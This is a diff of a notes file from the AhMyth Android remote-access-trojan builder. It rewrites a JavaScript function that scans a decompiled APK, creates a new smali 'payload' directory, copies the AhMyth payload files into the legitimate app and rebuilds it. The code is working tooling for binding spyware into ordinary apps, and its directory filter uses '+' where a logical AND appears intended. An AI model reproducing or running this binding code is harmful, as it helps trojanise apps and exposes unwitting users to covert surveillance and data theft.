@@ -1,51 +1,97 @@
 # Smali Payload Directory Creation Function 
 ```js
-fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
-    if (error) {
-        console.log('Reading the Decompiled APK Failed!')
-        console.log();
-        return;
+$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-    } else {
-
-        var ignoreDirs = ['original', 'res', 'build', 'kotlin'];
-        var smaliList = files
-            .filter((item) => item.isDirectory() +
-            !(ignoreDirs.includes(item.name)))
-            .map((item) => item.name)
-        var collator = new Intl.Collator([], {numeric: true});
-        smaliList.sort((a, b) => collator.compare(a, b));
-        var lastSmali = smaliList[smaliList.length -1];
-        if (lastSmali == "smali") {
-            fs.mkdir(apkFolder + '/smali_classes2', { recursive: true }, (error) => {
-                if (error) {
-                    console.log("Unable to create the smali payload directory");
-                    console.log();
-                    return;
-                };
-
-            });
+    $appCtrl.Log("Reading the Decompiled APK folder...");
+    $appCtrl.Log();
+    fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
+        if (error) {
+            $appCtrl.Log('Reading the Decompiled APK Failed!')
+            $appCtrl.Log();
+            return;
 
         } else {
 
-            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
-            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
-            var newSmaliNumber = lastSmaliNumber+1;
-            var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
-            fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
-                if (error) {
-                    console.log("Unable to create the smali Payload Directory");
-                    console.log();
-                    return;
-                };
+            $appCtrl.Log("Sorting the List of Smali Directories...")
+            var ignoreDirs = ['original', 'res', 'build', 'kotlin'];
+            var smaliList = files
+                .filter((item) => item.isDirectory() +
+                !(ignoreDirs.includes(item.name)))
+                .map((item) => item.name)
+            var collator = new Intl.Collator([], {numeric: true});
+            smaliList.sort((a, b) => collator.compare(a, b));
+            var lastSmali = smaliList[smaliList.length -1];
+            if (lastSmali == "smali") {
+                var payloadSmaliFolder = '/smali_classes2';
+                $appCtrl.Log('Creating the new Smali Payload Directory...')
+                $appCtrl.Log();
+                fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
+                    if (error) {
+                        $appCtrl.Log("Unable to Create the Smali Payload Directory!");
+                        $appCtrl.Log();
+                        return;
+                    };
 
-            });
+                    $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
+                    $appCtrl.Log();
+                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => {
+                        if (error) {
+                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                            $appCtrl.Log();
+                            fs.mkdir(logPath);
+                            fs.writeFile(path.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
+                            $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log();
+                            return;
+                        }
+                
+                        $appCtrl.GenerateApk(apkFolder);
+                    });
+
+                });
+
+            } else {
+
+                var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
+                var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
+                var newSmaliNumber = lastSmaliNumber+1;
+                var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
+                $appCtrl.Log('Creating the new Smali Payload Directory...')
+                $appCtrl.Log();
+                fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
+                    if (error) {
+                        $appCtrl.Log("Unable to Create the Smali Payload Directory!");
+                        $appCtrl.Log();
+                        return;
+                    };
+                    
+                    $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
+                    $appCtrl.Log();
+                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => {
+                        if (error) {
+                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                            $appCtrl.Log();
+                            fs.mkdir(logPath);
+                            fs.writeFile(path.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
+                            $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log();
+                            return;
+                        }
+                
+                        $appCtrl.GenerateApk(apkFolder);
+                    });
+
+                });
+
+            };
 
         };
 
-    };
+    });
 
-});
+};
 ```
 # Backup Cross Platform Bind On Launch function
 Stored just in case of problems with the original Cross platform bind on launch function
